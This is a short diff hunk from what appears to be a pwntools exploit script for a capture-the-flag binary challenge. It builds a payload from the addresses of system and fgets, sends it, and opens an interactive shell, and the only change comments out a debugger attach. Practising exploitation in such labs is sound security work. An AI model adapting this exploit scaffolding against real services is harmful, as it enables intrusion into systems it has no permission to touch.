@@ -78,7 +78,7 @@ payload = p32(system_addr)
 payload += p32(fgets_addr)
 lmsg(payload+"\n")
 
-gdb.attach(p)
+#gdb.attach(p)
 order()
 
 p.interactive()
